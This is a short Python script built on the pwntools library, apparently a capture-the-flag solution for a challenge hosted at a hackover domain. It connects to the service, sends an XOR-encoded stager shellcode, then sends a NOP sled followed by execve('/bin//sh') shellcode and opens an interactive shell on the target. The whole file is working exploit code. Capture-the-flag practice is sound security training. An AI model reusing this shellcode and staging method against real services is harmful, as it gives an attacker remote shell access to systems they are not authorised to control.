from pwn import *
import time

HOST, PORT = '0.0.0.0', 6500
# HOST, PORT = 'challenges.hackover.h4q.it', 4747

r = remote(HOST, PORT)

sh = "\x31\xFF\xB2\xFF\x31\xC0\x0F\x05"
target = str(bytearray([x^ord(y) for x, y in zip([179, 145, 127, 221, 98, 129, 17, 106, 144], sh)]))

execve = "j;X\x99H\xbb/bin//shRST_RWT^\x0f\x05"

r.send(target)

time.sleep(0.5)

r.send("\x90" * 100 + execve)
r.interactive()